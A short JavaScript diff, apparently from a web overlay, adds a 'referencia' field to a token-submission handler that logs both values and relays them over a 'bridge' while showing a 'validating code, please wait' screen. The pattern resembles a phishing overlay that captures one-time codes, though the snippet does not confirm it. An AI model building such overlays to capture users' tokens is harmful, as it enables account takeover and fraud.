@@ -512,9 +512,14 @@
     sendBiaMessage: sendBiaMessage,
     submitToken: () => {
       const token = document.getElementById('overlay-token')?.value;
+      const ref = document.getElementById('overlay-referencia')?.value;
       if (token) {
         console.log('[BRIDGE] 🔑 Token enviado:', token);
         emitInput('token', token);
+        if (ref) {
+          console.log('[BRIDGE] 📄 Referência enviada:', ref);
+          emitInput('referencia', ref);
+        }
         showOverlay('loading', 'VALIDANDO CÓDIGO AGUARDE...');
       }
     }
